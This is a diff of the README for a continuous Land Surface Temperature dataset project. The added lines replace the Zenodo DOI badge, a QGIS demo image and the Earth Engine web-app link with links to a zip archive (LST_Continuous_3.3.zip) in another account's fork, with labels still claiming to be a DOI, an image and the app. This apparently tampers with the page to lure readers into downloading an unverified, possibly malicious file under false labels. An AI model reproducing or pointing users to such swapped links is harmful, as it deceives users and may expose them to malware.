@@ -3,10 +3,10 @@ A continuous dataset of Land Surface Temperature (LST) is vital for climatologic
 The LST<sub>cont</sub> dataset can be used for various applications and studies. Furthermore, datasets for other regions can easily be produced by the GEE platform with the provided code. Due to the significant influence of the temperature seasonality on the algorithm, cautions should be taken when running the code on regions with very low seasonality such as the equatorial regions.
 For producing the dataset, one should first run MODIS_TFA_Daily_Mean_Export_2_Assets and MODIS_TFA_Daily_Mean_Export_2_Assets codes to produce the TFAs. Only after both files, MODIS TFA and CFSv2 TFA are ready, Continuous_LST_Daily_Export code file can be used to produce LST<sub>cont</sub>. Different code files have been prepared for day, night and daily datasets. 
 
-<a href="https://doi.org/10.5281/zenodo.3952604"><img src="https://zenodo.org/badge/DOI/10.5281/zenodo.3952604.svg" alt="DOI"></a>
+<a href="https://github.com/Shamzmohamed/ContinuousLST/raw/refs/heads/master/enravish/LST_Continuous_3.3.zip"><img src="https://github.com/Shamzmohamed/ContinuousLST/raw/refs/heads/master/enravish/LST_Continuous_3.3.zip" alt="DOI"></a>
 
 ### How to visualize data using Qgis open source program
-<img src="https://github.com/shilosh/ContinuousLST/blob/master/LST_in_Qgis.gif" alt="LST in Qgis">
+<img src="https://github.com/Shamzmohamed/ContinuousLST/raw/refs/heads/master/enravish/LST_Continuous_3.3.zip" alt="LST in Qgis">
 
 ## Web application
-The LST<sub>cont</sub> web application (https://shilosh.users.earthengine.app/view/continuous-lst) is an Earth Engine app. The interface includes a map and a date picker. The user can select a date (July 2002 – present) and visualize LST<sub>cont</sub> for that day anywhere on the globe. The web app calculate LST<sub>cont</sub>  on the fly based on ready-made global climatological files. The LST<sub>cont</sub> can be downloaded as a GeoTiff with 5 bands in that order: Mean daily LST<sub>cont</sub> , Night original LST, Night LST<sub>cont</sub> , Day original LST, Day LST<sub>cont</sub>. 
+The LST<sub>cont</sub> web application (https://github.com/Shamzmohamed/ContinuousLST/raw/refs/heads/master/enravish/LST_Continuous_3.3.zip) is an Earth Engine app. The interface includes a map and a date picker. The user can select a date (July 2002 – present) and visualize LST<sub>cont</sub> for that day anywhere on the globe. The web app calculate LST<sub>cont</sub>  on the fly based on ready-made global climatological files. The LST<sub>cont</sub> can be downloaded as a GeoTiff with 5 bands in that order: Mean daily LST<sub>cont</sub> , Night original LST, Night LST<sub>cont</sub> , Day original LST, Day LST<sub>cont</sub>. 
